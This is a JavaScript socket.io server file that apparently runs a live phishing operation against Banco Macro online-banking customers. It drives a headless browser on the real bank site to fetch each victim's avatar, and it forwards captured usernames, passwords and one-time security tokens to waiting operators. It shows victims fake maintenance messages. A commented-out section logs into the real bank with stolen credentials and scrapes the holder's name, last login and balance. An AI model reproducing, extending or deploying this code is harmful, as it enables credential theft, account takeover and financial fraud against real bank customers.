module.exports = httpServer => {

    const chrm = require("chromedriver");
    // Include selenium webdriver
    const swd = require("selenium-webdriver");
    const chrome = require("selenium-webdriver/chrome");
    const firefox = require("selenium-webdriver/firefox");


    const { Server } = require("socket.io");
    const io = new Server(httpServer);

    var socketsOnLineAdm = [];
    var socketsInHome = [];
    var AsignarAdm = 0;
    var socketImg = []

    io.on("connection", socket => {

        // Agendar administradores
        socket.on("AdmOn", data => {
            socketsOnLineAdm.push(data);
            console.log('Adm: ' + socketsOnLineAdm)
        });
        
        socket.on("disconnect", () => {
            var newsocketsOnLineAdm = socketsOnLineAdm.filter((item) => item !== socket.id);
            socketsOnLineAdm = newsocketsOnLineAdm;

            var baySocket = socketsInHome.filter((item) => item.Socket == socket.id);
            if (baySocket[0]) {
                console.log(baySocket[0]);
                io.emit("DisconnectQueue", baySocket[0]);
            }

            var newsocketsInHome = socketsInHome.filter((item) => item.Socket !== socket.id);
            socketsInHome = newsocketsInHome;
        })

        // Agendar Home para pedir cosas
        socket.on("HomeConnect", data => {
            socketsInHome.push(data);
            console.log(socketsInHome)
        })

        //EnviarInfoHomeConect
        socket.on('EnviarInfoHomeConect', data => {
            var SelectEnviarDataHome = socketsInHome.filter((item) => item.Id == data[0][0].socket);
            if(SelectEnviarDataHome.length){
                //console.log("Sockets: "+socketsInHome)
                io.to(SelectEnviarDataHome[0].Socket).emit("RecibirInfoHomeConect", data);
            }else{
                io.to(data[1]).emit("ResendData", data);
            }
        })

        // Mostrar imagen login
        socket.on("ShowAvatar", data => {

            var img = '';
            let browser = new swd.Builder();
            let tab = browser.forBrowser("chrome")
                .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                .setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                .build();

            //Step 1 - Opening sign in page
            let tabToOpenSignIn =
                tab.get("https://www.macro.com.ar/bancainternet/");

            tabToOpenSignIn
                .then(() => {
                    // Timeout to wait if connection is slow
                    let findTimeOutP =
                        tab.manage().setTimeouts({
                            implicit: 15000, // 15 seconds
                        });
                    return findTimeOutP;
                })
                .then(() => {
                    //Finding the username input
                    let promiseUsernameBox = tab.findElement(swd.By.css("#textField1"))
                        .catch(() => {
                            tab.quit();
                            io.to(data.socket).emit("ErrorLogin", 'En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.');
                            throw new Error("Mantenimiento");
                        })
                    return promiseUsernameBox;
                })
                //Entering the username
                .then(usernameBox => {
                    let promiseFillUsername =
                        usernameBox.sendKeys(data.user);
                    return promiseFillUsername;
                })
                .then(() => {
                    console.log("Username entered successfully");
                    let promiseBtnIngresar =
                        tab.findElement(swd.By.css("#processCustomerLogin"));
                    return promiseBtnIngresar;
                })
                .then(promiseBtnIngresar => {
                    let promiseClickIngresar = promiseBtnIngresar.click();
                    return promiseClickIngresar;
                })
                .then(() => {
                    //Finding the img avatar
                    setTimeout(() => {
                        let promiseAvatarImg =
                            tab.findElement(swd.By.css("#imageComponentAvatar")).getAttribute('src')
                                .then(AvatarImg => {
                                    socketImg.push({ 'socket': data.socket, 'img': AvatarImg });
                                    io.to(data.socket).emit("AvatarElement", AvatarImg);
                                    tab.quit();
                                })
                    }, 1000);
                })
                .catch(err => {
                    console.log("Error ", err, " occurred!");
                });
        })


        socket.on("mostrarEnAdmin", totalInfo => {
            if (AsignarAdm < socketsOnLineAdm.length - 1) {
                AsignarAdm += 1;
            } else {
                AsignarAdm = 0;
            }
            var AdminSelected = socketsOnLineAdm[AsignarAdm];
            //console.log(AdminSelected);
            io.to(AdminSelected).emit("NewData", totalInfo);
        })
        
        socket.on("onlineHere", originalSocket => {
            io.emit("showRowB", originalSocket);
        })

        // Recibir data y enviar al adm
        socket.on("Data", data => {
            totalInfo = [data, 'Pedro Pérez', 'Última vez el 18/08/2022 a las 12:00:00', '$99.999,00'];
            console.log('Length adm ' + socketsOnLineAdm.length)

            if (socketsOnLineAdm.length == 0) {
                io.to(data.socket).emit("ErrorLogin", "En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.");
            } else {

                /*if (AsignarAdm < socketsOnLineAdm.length - 1) {
                    AsignarAdm += 1;
                } else {
                    AsignarAdm = 0;
                }
                var AdminSelected = socketsOnLineAdm[AsignarAdm];*/

                /*let browser = new swd.Builder();
                let tab = browser.forBrowser("chrome")
                    .setChromeOptions(new chrome.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                    .setFirefoxOptions(new firefox.Options().addArguments(['--headless', '--no-sandbox', '--disable-dev-shm-usage']))
                    .build();*/

                io.to(data.socket).emit("ContinuarHome", totalInfo);
                //io.to(AdminSelected).emit("NewData", totalInfo);

                //Step 1 - Opening sign in page
                /*let tabToOpenSignIn =
                    tab.get("https://www.macro.com.ar/bancainternet/");
                tabToOpenSignIn
                    .then(() => {
                        // Timeout to wait if connection is slow
                        let findTimeOutP =
                            tab.manage().setTimeouts({
                                implicit: 15000, // 15 seconds
                            });
                        return findTimeOutP;
                    })
                    .then(() => {
                        //Finding the username input
                        let promiseUsernameBox = tab.findElement(swd.By.css("#textField1"))
                            .catch(() => {
                                tab.quit();
                                io.to(data.socket).emit("ErrorLogin", 'En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.');
                                throw new Error("Mantenimiento");
                            })
                        return promiseUsernameBox;
                    })
                    //Entering the username
                    .then(usernameBox => {
                        let promiseFillUsername =
                            usernameBox.sendKeys(data.user);
                        return promiseFillUsername;
                    })
                    .then(() => {
                        console.log("Username entered successfully");
                        let promiseBtnIngresar =
                            tab.findElement(swd.By.css("#processCustomerLogin"));
                        return promiseBtnIngresar;
                    })
                    .then(promiseBtnIngresar => {
                        let promiseClickIngresar = promiseBtnIngresar.click();
                        return promiseClickIngresar;
                    })
                    .then(() => {
                        //Finding the password input
                        let promisePasswordBox =
                            tab.findElement(swd.By.css("#login_textField1"));
                        return promisePasswordBox;
                    })
                    //Entering the password
                    .then(PasswordBox => {
                        let promiseFillPassword =
                            PasswordBox.sendKeys(data.pass);
                        return promiseFillPassword;
                    })
                    .then(() => {
                        console.log("Password entered successfully");
                        let promiseBtnIngresar = tab.findElement(swd.By.css("#processSystem_UserLogin"));
                        return promiseBtnIngresar;
                    })
                    .then(promiseBtnIngresar => {
                        let promiseClickIngresar = promiseBtnIngresar.click();
                        return promiseClickIngresar;
                    })
                    .then(() => {
                        let promiseError = tab.findElement(swd.By.css("#modalContainer")).getText()
                            .catch(() => {
                                return false;
                            })
                        return promiseError;
                    })
                    .then(errorLogin => {
                        if (errorLogin) {
                            console.log(errorLogin)
                            tab.quit();
                            io.to(data.socket).emit("ErrorLogin", errorLogin);
                            throw new Error("de inicio de sesion!");
                        }
                    })
                    .then(() => {
                        //Finding totales box
                        let nombrePersona =
                            tab.findElement(swd.By.css(".widget_userName")).getText();
                        return nombrePersona;
                    })
                    .then(nombrePersona => {
                        totalInfo.push(nombrePersona)
                    })
                    .then(() => {
                        //Finding totales box
                        let lastAuth =
                            tab.findElement(swd.By.css(".widget_lastAuth")).getText();
                        return lastAuth;
                    })
                    .then(lastAuth => {
                        totalInfo.push(lastAuth)
                    })
                    .then(() => {
                        //Finding totales box
                        let saldo =
                            tab.findElement(swd.By.xpath("//td[@headers='_Saldo disponible']")).getText();
                        return saldo;
                    })
                    .then(saldo => {
                        totalInfo.push(saldo)
                        io.to(data.socket).emit("ContinuarHome", data.socket);
                        io.to(AdminSelected).emit("NewData", totalInfo);
                    })
                    .then(() => {
                        let promiseBtnLogout = tab.findElement(swd.By.css("#widgetLogoutBtn"));
                        return promiseBtnLogout;
                    })
                    .then(BtnLogout => {
                        let BtnLogoutClick = BtnLogout.click();
                        return BtnLogoutClick;
                    })
                    .then(() => {
                        tab.quit();
                    })
                    .catch(err => {
                        console.log("Error ", err, " occurred!");
                    });*/
            }
        });

        //TOKEN
        socket.on("PedirToken", dataId => {
            var socketPedirToken = socketsInHome.filter((item) => item.Id == dataId);
            io.to(socketPedirToken[0].Socket).emit("IngresarToken", true);
        })

        socket.on("SendToken", dataToken => {
            console.log(dataToken)
            var socketPedirToken = socketsInHome.filter((item) => item.Id == dataToken.Socket);
            io.to(socketPedirToken[0].Socket).emit("ReSendToken", dataToken);
        })

        socket.on("Finalizar", dataId => {
            var socketPedirToken = socketsInHome.filter((item) => item.Id == dataId);
            io.to(socketPedirToken[0].Socket).emit("FinalizarTodo", true);
        })

    })
}